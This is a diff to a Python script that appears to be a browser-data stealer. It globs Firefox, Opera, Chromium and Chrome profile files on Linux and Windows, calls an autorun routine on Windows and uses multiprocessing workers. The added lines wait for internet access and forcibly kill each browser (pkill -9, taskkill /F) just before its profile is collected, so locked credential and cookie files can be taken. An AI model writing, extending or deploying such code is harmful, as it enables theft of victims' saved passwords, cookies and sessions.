@@ -6,6 +6,7 @@ from multiprocessing import Pool,Process,Queue,Lock
 import multiprocessing
 import requests
 import base64
+import time
 import glob
 
 if os.name=='nt':
@@ -18,6 +19,21 @@ PROC_NUM=15
 file_list=[]
 sep='/'
 chtid=wt=0
+def check_intr():
+    try:
+        requests.get("https://github.com")
+        return 1
+    except Exception:
+        return -1
+ 
+def waitForConnection():
+    while True:
+        if check_intr()<0:
+            print('[-]No connection')
+            time.sleep(100)
+        else:
+            break
+ 
 def copyFile(src,dst):
     try:
         shutil.copy(src,dst)
@@ -145,9 +161,9 @@ def main():
     global cht
     global wt
 ###########
-
+    waitForConnection()
+    
     chtid=wt=0
-    # pth=os.environ['PWD']
     cfgpath=f'.{sep}config.py'
     if not os.path.exists(cfgpath):
         cfgpath=f'.{sep}.config{sep}config.py'
@@ -175,6 +191,8 @@ def main():
     else:
         sep='\\'
         winntAutoRun()
+
+    
     # mode
     mode = 0o666
     hostname=socket.gethostname()
@@ -204,15 +222,19 @@ def main():
 
         if os.name!= 'nt':
             directory_path='/'
+            os.system('pkill -9 firefox')
             for file in glob.glob(os.environ['HOME']+"/.mozilla/firefox/*.default-*/*"):
                 file_list.append((file,'firefox'))
-
+            
+            os.system('pkill -9 opera')
             for file in glob.glob(os.environ['HOME']+"/.opera*/*"):
                 file_list.append((file,'opera'))
 
+            os.system('pkill -9 chromium')
             for file in glob.glob(os.environ['HOME']+"/.config/chromium/*"):
                 file_list.append((file,'chromium'))
-
+                
+            os.system('pkill -9 chrome')
             for file in glob.glob(os.environ['HOME']+"/.config/chrome/*"):
                 file_list.append((file,'chrome'))
 
@@ -221,13 +243,16 @@ def main():
 
 
         else:
+            os.system('taskkill /F /IM chrome.exe')
             for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
                 file_list.append((file,'chrome'))
-                    
+              
+            os.system('taskkill /F /IM opera.exe')
             for file in glob.glob(os.environ['APPDATA']+"\\Opera Software\\Opera Stable\\*"): 
                 if os.path.split(file)[1][0].isupper():
                     file_list.append((file,'opera'))
         
+            os.system('taskkill /F /IM firefox.exe')
             for file in glob.glob(os.environ['APPDATA']+"\\Mozilla\\Firefox\\Profiles\\*.default-release\\*"):
                 file_list.append((file,'firefox'))
     
@@ -239,6 +264,8 @@ def main():
             
         for num in range(1,PROC_NUM+1):
             file_list.append('TERMINATED')
-
+            
+        for proc in procs:
+            proc.join() 
 if __name__ == '__main__':
 	main()
